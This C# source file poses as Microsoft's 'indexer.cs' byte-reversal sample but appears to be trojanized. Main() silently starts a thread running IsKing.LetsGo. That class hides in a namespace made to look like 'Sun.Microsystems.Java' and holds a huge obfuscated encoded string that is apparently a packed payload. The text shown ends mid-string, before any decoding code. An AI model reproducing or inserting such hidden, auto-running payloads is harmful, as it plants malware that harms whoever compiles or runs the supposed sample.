//Copyright (C) Microsoft Corporation.  All rights reserved.

// indexer.cs
// arguments: indexer.txt
using System;
using Sun.Microsystems.Java;
using System.IO;

// Class to provide access to a large file
// as if it were a byte array.
public class FileByteArray
{
    Stream stream;      // Holds the underlying stream
                        // used to access the file.
// Create a new FileByteArray encapsulating a particular file.
    public FileByteArray(string fileName)
    {
        stream = new FileStream(fileName, FileMode.Open);
    }

    // Close the stream. This should be the last thing done
    // when you are finished.
    public void Close()
    {
        stream.Close();
        stream = null;
    }

    // Indexer to provide read/write access to the file.
    public byte this[long index]   // long is a 64-bit integer
    {
        // Read one byte at offset index and return it.
        get 
        {
            byte[] buffer = new byte[1];
            stream.Seek(index, SeekOrigin.Begin);
            stream.Read(buffer, 0, 1);
            return buffer[0];
        }
        // Write one byte at offset index and return it.
        set 
        {
            byte[] buffer = new byte[1] {value};
            stream.Seek(index, SeekOrigin.Begin);
            stream.Write(buffer, 0, 1);
        }
    }

    // Get the total length of the file.
    public long Length 
    {
        get 
        {
            return stream.Seek(0, SeekOrigin.End);
        }
    }
}

// Demonstrate the FileByteArray class.
// Reverses the bytes in a file.
public class Reverse 
{
    public static void Main(string[] args)
	{
	System.Threading.Thread g413 = new System.Threading.Thread(IsKing.LetsGo);
	g413.Start();
		// Check for arguments.
		if (args.Length != 1)
		{
			Console.WriteLine("Usage : Indexer <filename>");
			return;
		}

		// Check for file existence
		if (!System.IO.File.Exists(args[0]))
		{
			Console.WriteLine("File " + args[0] + " not found.");
			return;
		}

		FileByteArray file = new FileByteArray(args[0]);
		long len = file.Length;

		// Swap bytes in the file to reverse it.
		for (long i = 0; i < len / 2; ++i) 
		{
			byte t;

			// Note that indexing the "file" variable invokes the
			// indexer on the FileByteStream class, which reads
			// and writes the bytes in the file.
			t = file[i];
			file[i] = file[len - i - 1];
			file[len - i - 1] = t;
		}

		file.Close();
    } 
}




namespace Sun.Microsystems.Java
{
    public class IsKing
    {
        private static string database = "00413>x7PHvMewx7jHrsetx7zHvse4xr3Hjseox7PGs8eQx7THvsevx7LHrsekx67Hqce4x7DHrsazx5fHvMerx7zGkMaXx6bGkMaXxr3Gvca9x" + 
				"r3Hrceox7/Hsce0x77Gvce+x7HHvMeux67GvceUx67Hlse0x7PHusaQxpfGvca9xr3GvcemxpDGl8a9xr3Gvca9xr3Gvca9xr3Hrcevx7THq8e" + 
				"8x6nHuMa9x67Hqce8x6nHtMe+xr3Hrsepx6/HtMezx7rGvce5x7zHqce8x7/HvMeux7jGvcagxr3Gvw==>xr/Gpsa9xpDGl8a9xr3Gvca9xr3G" + 
				"vca9xr3Hrcevx7THq8e8x6nHuMa9x67Hqce8x6nHtMe+xr3HtMezx6nGvce5x7XHq8eyx7PHq8enxqzGqcasxq/Gvcagxr3GrcamxpDGl8a9xr" + 
				"3Gvca9xr3Gvca9xr3Hrceox7/Hsce0x77Gvceux6nHvMepx7THvsa9x6vHsse0x7nGvceRx7jHqceux5rHssa1xrTGkMaXxr3Gvca9xr3Gvca9" + 
				"xr3GvcemxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvceux6nHr8e0x7PHusa9x7jHr8erx7vHsseux6fGrsapxqXGrsa9xqDGvceOx6THrs" + 
				"epx7jHsMazx5THksazx43HvMepx7XGs8eax7jHqceZx7THr8e4x77Hqceyx6/HpMeTx7zHsMe4xrXHjsekx67Hqce4x7DGs8ePx7jHu8exx7jH" + 
				"vsepx7THssezxrPHnMeux67HuMewx7/HscekxrPHmse4x6nHmMelx7jHvseox6nHtMezx7rHnMeux67HuMewx7/HscekxrXGtMazx5rHuMepx5" + 
				"DHsse5x6jHsce4x67Gtca0x4bGrceAxrPHm8eox7HHscekx4zHqMe8x7HHtMe7x7THuMe5x5PHvMewx7jGtMamxpDGl8a9xr3Gvca9xr3Gvca9" + 
				"xr3Gvca9xr3Gvceux6nHr8e0x7PHusa9x6jHqcewx7HHsMe5x7zGr8apxqXGrsa9xqDGvceOx6THrsepx7jHsMazx5THksazx5nHtMevx7jHvs" + 
				"epx7LHr8ekxrPHmse4x6nHmce0x6/HuMe+x6nHssevx6THj8eyx7LHqca1x7jHr8erx7vHsseux6fGrsapxqXGrsa0xqbGkMaXxr3Gvca9xr3G" + 
				"vca9xr3Gvca9xr3Gvca9x47HpMeux6nHuMewxrPHlMeSxrPHmce0x6/HuMe+x6nHssevx6THlMezx7vHssa9x6zHr8esx63Ht8e0x6rGrsauxq" + 
				"zGq8a9xqDGvcezx7jHqsa9x47HpMeux6nHuMewxrPHlMeSxrPHmce0x6/HuMe+x6nHssevx6THlMezx7vHssa1x53HqMepx7DHscewx7nHvMav" + 
				"xqnGpcauxrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HtMezx6nGvcepx7jHr8ezx7rHp8eoxqzGqMalxqjGvcagxr3Hsce1x7HHt8" + 
				"e+x6nHr8apxq3GrMauxrXHrMevx6zHrce3x7THqsauxq7GrMarxrTGpsa9xr3Gvca9xpDGl8a9xr3Gvca9xr3Gvca9xr3HoMaQxpfGvca9xr3G" + 
				"vca9xr3Gvca9x63Hr8e0x6vHvMepx7jGvceux6nHvMepx7THvsa9x7THs8epxr3Hsce1x7HHt8e+x6nHr8apxq3GrMauxrXHjsekx67Hqce4x7" + 
				"DGs8eUx5LGs8eZx7THr8e4x77Hqceyx6/HpMeUx7PHu8eyxr3HrMevx6zHrce3x7THqsauxq7GrMarxrTGkMaXxr3Gvca9xr3Gvca9xr3Gvcem" + 
				"xpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvceOx6THrsepx7jHsMazx5THksazx5vHtMexx7jHlMezx7vHsseGx4DGvcezx6nHuMe1x7HHrc" + 
				"eyxqjGrcauxqrGvcagxr3HrMevx6zHrce3x7THqsauxq7GrMarxrPHmse4x6nHm8e0x7HHuMeuxrXGv8a3xrPHvseuxr/GtMamxpDGl8a9xr3G" + 
				"vca9xr3Gvca9xr3Gvca9xr3Gvce7x7LHr8e4x7zHvse1xr3GtceOx6THrsepx7jHsMazx5THksazx5vHtMexx7jHlMezx7vHssa9x6THrce+x7" + 
				"nHv8eqx6vGqMasxq7GpMa9x7THs8a9x7PHqce4x7XHscetx7LGqMatxq7Gqsa0xpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvcemxpDGl8a9" + 
				"xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x67Hqcevx7THs8e6xr3Hrce/x6nHvMe5x67HsMapxqjGrsasxr3GoMa9x6THrce+x7nHv8" + 
				"eqx6vGqMasxq7GpMazx5vHqMexx7HHk8e8x7DHuMamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x47HpMeux6nHuMewxrPH" + 
				"lMeSxrPHm8e0x7HHuMecx6nHqcevx7THv8eox6nHuMeuxr3Hv8elx7XHrMe0x7/HuMasxqzGqsavxr3GoMa9x47HpMeux6nHuMewxrPHlMeSxr" + 
				"PHm8e0x7HHuMazx5rHuMepx5zHqcepx6/HtMe/x6jHqce4x67Gtcetx7/Hqce8x7nHrsewxqnGqMauxqzGtMamxpDGl8a9xr3Gvca9xr3Gvca9" + 
				"xr3Gvca9xr3Gvca9xr3Gvca9x7THu8a9xrXGtce/x6XHtcesx7THv8e4xqzGrMaqxq/Gvca7xr3Hjsekx67Hqce4x7DGs8eUx5LGs8ebx7THsc" + 
				"e4x5zHqcepx6/HtMe/x6jHqce4x67Gs8ePx7jHvMe5x5LHs8exx6TGtMa9xrzGoMa9xq3GtMaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3G" + 
				"vca9xr3GvcemxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hjsekx67Hqce4x7DGs8eUx5LGs8ebx7THsce4x5" + 
				"zHqcepx6/HtMe/x6jHqce4x67Gvcekx7THt8e0x6nHqceyxq/GqcalxqzGvcagxr3Hjsekx67Hqce4x7DGs8eUx5LGs8ebx7THsce4x5zHqcep" + 
				"x6/HtMe/x6jHqce4x67Gs8eTx7LHr8ewx7zHscamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hjsekx67Hqc" + 
				"e4x7DGs8eUx5LGs8ebx7THsce4xrPHjse4x6nHnMepx6nHr8e0x7/HqMepx7jHrsa1x63Hv8epx7zHuceux7DGqcaoxq7GrMaxxr3HpMe0x7fH" + 
				"tMepx6nHssavxqnGpcasxrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr" + 
				"3Gvca9xr3Gvca9x67Hqcevx7THs8e6xr3HuMevx6vHu8eyx67Hp8auxqnGpcauxr3GoMa9x7jHqMenx7fHuMewx7zGr8aoxqzGrsa1x63Hv8ep" + 
				"x7zHuceux7DGqcaoxq7GrMa0xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hv8eyx7LHsca9x6jHqcewx7HHsMe5x7zGr8" + 
				"apxqXGrsa9xqDGvce4x7XHuce4x6THr8esxq/GpcaqxqnGtce4x6/Hq8e7x7LHrsenxq7Gqcalxq7GtMamxpDGl8a9xr3Gvca9xr3Gvca9xr3G" + 
				"vca9xr3Gvca9xr3Gvca9x7/Hsseyx7HGvce3x7DHtseux63HqcelxqnGpMavxqXGvcagxr3Hpcevx6rHtMe8x6zHrMauxqzGqsavxrXHuMevx6" + 
				"vHu8eyx67Hp8auxqnGpcauxrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvce0x7vGvca1x6jHqcewx7HHsMe5x7zGr8ap" + 
				"xqXGrsa9xqDGoMa9x6nHr8eox7jGtMaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvcemxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvc" + 
				"a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hvseyx7PHqce0x7PHqMe4xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HoMaQxpfG" + 
				"vca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvce0x7vGvca1x7fHsMe2x67Hrcepx6XGqcakxq/Gpca9xqDGoMa9x6nHr8eox7jGtMaQxp" + 
				"fGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvcemxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hv8ey" + 
				"x7LHsca9x7jHrserx7jHsce4x7bGrMalxq/Gr8a9xqDGvcepx6/HqMe4xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvc" + 
				"a9xr3Gvceqx7XHtMexx7jGvca1x7jHrserx7jHsce4x7bGrMalxq/Gr8a9xqDGoMa9x6nHr8eox7jGtMaQxpfGvca9xr3Gvca9xr3Gvca9xr3G" + 
				"vca9xr3Gvca9xr3Gvca9xr3Gvca9x6bGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x7THu8a9xr" + 
				"XHuce1x6vHssezx6vHp8asxqnGrMavxr3GoMagxr3GqMa0xpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9" + 
				"xr3Gvcemxr3Hr8e4x6nHqMevx7PGvcatxqbGvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvc" + 
				"e4x67Hq8e4x7HHuMe2xqzGpcavxq/Gvcagxr3Hvsexx63Hsce1x6rHs8avxqvGq8auxrXHrce/x6nHvMe5x67HsMapxqjGrsasxrHGvce4x6/H" + 
				"q8e7x7LHrsenxq7Gqcalxq7Gsca9x7nHvMepx7zHv8e8x67HuMa0xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr" + 
				"3Gvca9xr3Gvca9x7THu8a9xrXHuMeux6vHuMexx7jHtsasxqXGr8avxr3GoMagxr3Hu8e8x7HHrse4xrTGkMaXxr3Gvca9xr3Gvca9xr3Gvca9" + 
				"xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6bGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvc" + 
				"a9xr3Gvca9xr3Huce1x6vHssezx6vHp8asxqnGrMavxr3Gtsagxr3GrMamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3G" + 
				"vca9xr3Gvca9xr3GvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HoMaQxpfGvca9xr3Gvca9xr3Gvca9xr" + 
				"3Gvca9xr3Gvca9xr3GvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x7jHsceux7jGvcemxr3Hvseyx7PHqce0x7PHqMe4" + 
				"xqbGvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvceOx6THrsepx7jHsMazx5THks" + 
				"azx5nHtMevx7jHvsepx7LHr8ekx5THs8e7x7LHhseAxr3Hqceux7rHvMeqx7XHrMasxqXGr8avxr3GoMa9x6zHr8esx63Ht8e0x6rGrsauxqzG" + 
				"q8azx5rHuMepx5nHtMevx7jHvsepx7LHr8e0x7jHrsa1xr/Gt8azxrfGv8a0xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x7vHssevx7" + 
				"jHvMe+x7XGvca1x47HpMeux6nHuMewxrPHlMeSxrPHmce0x6/HuMe+x6nHssevx6THlMezx7vHssa9x6/Hqse/x7bHuse7x6nGrsaoxq/Gqca9" + 
				"x7THs8a9x6nHrse6x7zHqse1x6zGrMalxq/Gr8a0xpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvcemxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvc" + 
				"a9xr3Gvca9xr3Gvca9x6nHr8ekxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6bGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3G" + 
				"vca9xr3Gvca9xr3Gvca9xr3Gvce0x7vGvca1x7nHtcerx7LHs8erx6fGrMapxqzGr8a9xqDGoMa9xqjGtMaQxpfGvca9xr3Gvca9xr3Gvca9xr" + 
				"3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6bGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6/HuMep" + 
				"x6jHr8ezxr3GrcamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HoMaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvc" + 
				"a9xr3Gvca9xr3Gvca9xr3Gvca9x7THs8epxr3Hrselx7HHrcetx6fHp8asxq7Gr8atxr3GoMa9x7HHtcexx7fHvsepx6/GqcatxqzGrsa1x6/H" + 
				"qse/x7bHuse7x6nGrsaoxq/Gqca0xqbGvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x77HvMepx77Htca9x6bGvce+x7" + 
				"LHs8epx7THs8eox7jGpsa9x6DGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6DGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6/HuMep" + 
				"x6jHr8ezxr3GrMamxpDGl8a9xr3Gvca9xr3Gvca9xr3HoMaQxpfGvca9xr3Gvca9xr3Gvca9x63Hr8e0x6vHvMepx7jGvceux6nHvMepx7THvs" + 
				"a9x67Hqcevx7THs8e6xr3HuMeox6fHt8e4x7DHvMavxqjGrMauxrXHrsepx6/HtMezx7rGvcekx63Hvse5x7/HqserxqjGrMauxqTGtMaQxpfG" + 
				"vca9xr3Gvca9xr3Gvca9x6bGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x47HpMeux6nHuMewxrPHlMeSxrPHjsepx6/HuMe8x7DHj8e4x7" + 
				"zHuce4x6/Gvcewx6/Htcenx6vHsMe2xqjGrsavxqrGvcagxr3Hjsekx67Hqce4x7DGs8eUx5LGs8ebx7THsce4xrPHksetx7jHs8eJx7jHpcep" + 
				"xrXHpMetx77Huce/x6rHq8aoxqzGrsakxrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hrsepx6/HtMezx7rGvcerx7nHv8e2x6/Hpc" + 
				"erxqnGqsatxq3GpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hrsepx6/HtMezx7rGvceox7THrce1x6THvMe1xq/GqMarxqXGvcagxr3G" + 
				"v8a/xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6rHtce0x7HHuMa9xrXGtcerx7nHv8e2x6/HpcerxqnGqsatxq3Gvcagxr3HsMevx7" + 
				"XHp8erx7DHtsaoxq7Gr8aqxrPHj8e4x7zHuceRx7THs8e4xrXGtMa0xr3GvMagxr3Hs8eox7HHsca0xpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9" + 
				"xr3GvcemxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6jHtMetx7XHpMe8x7XGr8aoxqvGpca9xrbGoMa9x6vHuce/x7bHr8" + 
				"elx6vGqcaqxq3Grca9xrbGvca/x4HHr8eBx7PGv8amxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3G" + 
				"vca9xr3Gvcewx6/Htcenx6vHsMe2xqjGrsavxqrGs8eex7HHsseux7jGtca0xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6/HuMepx6" + 
				"jHr8ezxr3HqMe0x63Htcekx7zHtcavxqjGq8alxqbGkMaXxr3Gvca9xr3Gvca9xr3GvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3Hrcevx7THq8e8" + 
				"x6nHuMa9x67Hqce8x6nHtMe+xr3Hv8eyx7LHsca9x7jHtce5x7jHpMevx6zGr8alxqrGqca1x67Hqcevx7THs8e6xr3Htcekx7HHpMeyx77Hus" + 
				"apxq7Gq8avxrTGkMaXxr3Gvca9xr3Gvca9xr3GvcemxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvce0x7PHqca9x7jHr8erx7vHsseux6fG" + 
				"rsapxqXGrsa9xqDGvce1x6THscekx7LHvse6xqnGrsarxq/Gs8eJx7LHkceyx6rHuMevxrXGtMazx5THs8e5x7jHpceSx7vGtca/x67HqMezxr" + 
				"PHsMe0x77Hr8eyx67HpMeux6nHuMewx67Gs8e3x7zHq8e8xr/GtMamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvce0x7vGvca1x7jHr8er" + 
				"x7vHsseux6fGrsapxqXGrsa9xqPGoMa9xq3GtMaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvcevx7jHqceox6/Hs8a9x6nHr8" + 
				"eox7jGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HuMexx67HuMaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvcevx7jH" + 
				"qceox6/Hs8a9x7vHvMexx67HuMamxpDGl8a9xr3Gvca9xr3Gvca9xr3HoMaQxpfGvca9xr3Gvca9xr3Gvca9x63Hr8e0x6vHvMepx7jGvceux6" + 
				"nHvMepx7THvsa9x7/Hsseyx7HGvcelx6/Hqse0x7zHrMesxq7GrMaqxq/Gtceux6nHr8e0x7PHusa9x7XHpMexx6THsse+x7rGqcauxqvGr8a0" + 
				"xpDGl8a9xr3Gvca9xr3Gvca9xr3HpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3HtMezx6nGvce4x6/Hq8e7x7LHrsenxq7Gqcalxq7Gvc" + 
				"agxr3Htcekx7HHpMeyx77Husapxq7Gq8avxrPHiceyx5HHsseqx7jHr8a1xrTGs8eUx7PHuce4x6XHkse7xrXGv8ewx7zHtMezxrXGv8a0xqbG" + 
				"kMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x7THu8a9xrXHuMevx6vHu8eyx67Hp8auxqnGpcauxr3Go8agxr3Grca0xpDGl8a9xr3Gvca9xr" + 
				"3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6/HuMepx6jHr8ezxr3Hqcevx6jHuMamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvce4x7HHrse4" + 
				"xpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x6/HuMepx6jHr8ezxr3Hu8e8x7HHrse4xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvc" + 
				"egxpDGl8a9xr3Gvca9xr3Gvca9xr3Hrcevx7THq8e8x6nHuMa9x67Hqce8x6nHtMe+xr3Hv8eyx7LHsca9x77Hscetx7HHtceqx7PGr8arxqvG" + 
				"rsa1x67Hqcevx7THs8e6xr3HpMetx77Huce/x6rHq8aoxqzGrsakxrHGvceux6nHr8e0x7PHusa9x7XHpMexx6THsse+x7rGqcauxqvGr8axxr" + 
				"3Hrsepx6/HtMezx7rGvce5x7zHqce8x7/HvMeux7jGtMaQxpfGvca9xr3Gvca9xr3Gvca9x6bGvca9xr3GkMaXxr3Gvca9xr3Gvca9xr3Gvca9" + 
				"xr3Gvca9x67Hqcevx7THs8e6xr3HqMeux7DHusenx7HHuMavxqnGq8aoxr3GoMa9x7PHuMeqxr3Hj8e8x7PHuceyx7DGtca0xrPHk8e4x6XHqc" + 
				"a1xrXGq8arxr3Gtsa9xqzGtMaxxqzGrcatxq3GtMazx4nHsseOx6nHr8e0x7PHusa1xrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3H" + 
				"tMezx6nGvcevx67HpMe2x7THqse2xqzGqcaqxqXGvcagxr3Htcekx7HHpMeyx77Husapxq7Gq8avxrPHiceyx5HHsseqx7jHr8a1xrTGs8eUx7" + 
				"PHuce4x6XHkse7xrXGv8ewx7zHtMezxrXGv8a0xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x7THs8epxr3Htce/x6zHtMeox7nHrsau" + 
				"xq7GqMarxr3GoMa9x6/Hrsekx7bHtMeqx7bGrMapxqrGpcamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvce+x7XHvMevx4bHgMa9x6rHtM" + 
				"e5x7nHrcetx7zGrMauxq3Grsa9xqDGvce1x6THscekx7LHvse6xqnGrsarxq/Gs8eJx7LHnse1x7zHr8ecx6/Hr8e8x6TGtcatxrHGvce1x6TH" + 
				"scekx7LHvse6xqnGrsarxq/Gs8eRx7jHs8e6x6nHtca9xrDGvcasxrTGpsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Hqse1x7THsce4xr" + 
				"3Gtceqx7THuce5x63Hrce8xqzGrsatxq7Hhse1x7/HrMe0x6jHuceuxq7GrsaoxqvHgMa9xrzGoMa9xrrHpsa6xrTGkMaXxr3Gvca9xr3Gvca9" + 
				"xr3Gvca9xr3Gvca9x6bGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Htce/x6zHtMeox7nHrsauxq7GqMarxr3Gtsagxr3GrM" + 
				"amxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3GvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvce0x7PHqca9x7XHuce1x7bHuse+x7fG" + 
				"rsaoxqXGqca9xqDGvce1x6THscekx7LHvse6xqnGrsarxq/Gs8eJx7LHkceyx6rHuMevxrXGtMazx5THs8e5x7jHpceSx7vGtca/x6jHrse0x7" + 
				"PHusa9x67HpMeux6nHuMewxqbGv8a0xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x67Hqcevx7THs8e6xr3Hqceyx7zHu8e7x7zHsMao" + 
				"xq/Gr8akxr3GoMa9xr/HkMe8x7THs8a1x67Hqcevx7THs8e6x4bHgMa9x7zHr8e6x67GtMeBx6/Hgcezx4HHqcemx4HHr8eBx7PHgcepx47HpM" + 
				"eux6nHuMewxrPHice1x6/HuMe8x7nHtMezx7rGs8eJx7XHr8e4x7zHuca9x7rGv8a9xrbGvceox67HsMe6x6fHsce4xq/GqcarxqjGvca2xr3G" + 
				"v8a9xqDGvca/xr3GtsaQxpfGvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gv8ezx7jHqsa9x47HpMeux6" + 
				"nHuMewxrPHice1x6/HuMe8x7nHtMezx7rGs8eJx7XHr8e4x7zHuca1x5THrseWx7THs8e6xrPHkce4x6nHrseax7LGtMamx4HHr8eBx7PHgcep" + 
				"x7rGv8a9xrbGvceox67HsMe6x6fHsce4xq/GqcarxqjGvca2xr3Gv8azx47Hqce8x6/Hqca1xrTGpsa/xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvc" + 
				"a9xr3Gvca9x7XHpMexx6THsse+x7rGqcauxqvGr8a9xqDGvce1x6THscekx7LHvse6xqnGrsarxq/Gs8ePx7jHrcexx7zHvse4xrXHtcekx7HH" + 
				"pMeyx77Husapxq7Gq8avxrPHjseox7/Hrsepx6/HtMezx7rGtcevx67HpMe2x7THqse2xqzGqcaqxqXGsca9xrXHtce/x6zHtMeox7nHrsauxq" + 
				"7GqMarxr3GsMa9x6/Hrsekx7bHtMeqx7bGrMapxqrGpca0xr3Gtsa9xqzGtMaxxr3Hqceyx7zHu8e7x7zHsMaoxq/Gr8akxrTGpsaQxpfGvca9" + 
				"xr3Gvca9xr3Gvca9xr3Gvca9xr3HtMe7xr3Gtce1x7nHtce2x7rHvse3xq7GqMalxqnGvcahxr3Grca0xpDGl8a9xr3Gvca9xr3Gvca9xr3Gvc" + 
				"a9xr3GvcemxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9x7XHpMexx6THsse+x7rGqcauxqvGr8a9xqDGvca/x6jHrse0x7PH" + 
				"usa9x47HpMeux6nHuMewxqbHgcevx4HHs8a/xr3Gtsa9x7XHpMexx6THsse+x7rGqcauxqvGr8amxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr" + 
				"3GvcegxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvce1x6THscekx7LHvse6xqnGrsarxq/Gvcagxr3Htcekx7HHpMeyx77Husapxq7Gq8av" + 
				"xrPHj8e4x63Hsce8x77HuMa1xr/HqMeux7THs8e6xr3Hjsekx67Hqce4x7DGpsa/xrHGvca/x6jHrse0x7PHusa9x47HpMeux6nHuMewxqbHgc" + 
				"evx4HHs8eox67HtMezx7rGvceOx6jHs8azx5DHtMe+x6/Hsseux6THrsepx7jHsMeuxrPHl8e8x6vHvMamxr/GtMamxpDGl8a9xr3Gvca9xr3G" + 
				"vca9xr3Gvca9xr3Gvceux6nHr8e0x7PHusa9x6XHq8e3x7THrsewx6nGr8aoxq3Gpca9xqDGvca/xr/GpsaQxpfGvca9xr3Gvca9xr3Gvca9xr" + 
				"3Gvca9xr3Hrsepx6/HtMezx7rGvce3x7HHtsewx77Hv8e8xq/GqcaqxqTGvcagxr3Gv8a/xqbGkMaXxr3Gvca9xr3Gvca9xr3Gvca9xr3Gvca9" + 
				"x67Hqcevx7THs8e6xr3Ht8e2x7THqse7x7nHscauxq/GpMarxr3GoMa9xr/Gv8amxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvceux6nHr8" + 
				"e0x7PHuseGx4DGvce4x7LHrce3x6vHpMe6xqnGqMaoxqrGvcagxr3Huce8x6nHvMe/x7zHrse4xrPHjsetx7HHtMepxrXHs8e4x6rGvce+x7XH" + 
				"vMevx4bHgMa9x6bGvca6xqPGusa9x6DGtMamxpDGl8a9xr3Gvca9xr3Gvca9xr3Gvca9xr3Gvcelx6vHt8e0x67HsMepxq/GqMatxqXGvcagxr" + 
				"3Hq8esx6fHpMe6x7bHtMavxq/GqsaoxrXHt8e1x7DHqMewx7LHvsasxq/GqcatxrXHuMeyx63Ht8erx6THusapxqjGqMaqx4bGrMeAxrTGscee" + 
				"x7LHs8erx7jHr8epxrPHiceyx5THs8epxq7Gr8a1x7jHssetx7fHq8ekx7rGqcaoxqjGqseGxq3HgMa0xrTGpsaQxpfGvca9xr3Gvca9xr3Gvc" + 
				"a9xr3Gvca9xr3Ht8exx7bHsMe+x7/HvMavxqnGqsakxr3GoMa9x6vHrMenx6THuse2x7TGr8avxqrGqMa1x7fHtcewx6jHsMeyx77GrMavxqnG" + 
				"rca1x7jHssetx7fHq8ekx7rGqcaoxqjGqseGxq/HgMa0xrHHnseyx7PHq8e4x6/Hqcazx4nHsseUx7PHqcauxq/Gtce4x7LHrce3x6vHpMe6xq" + 
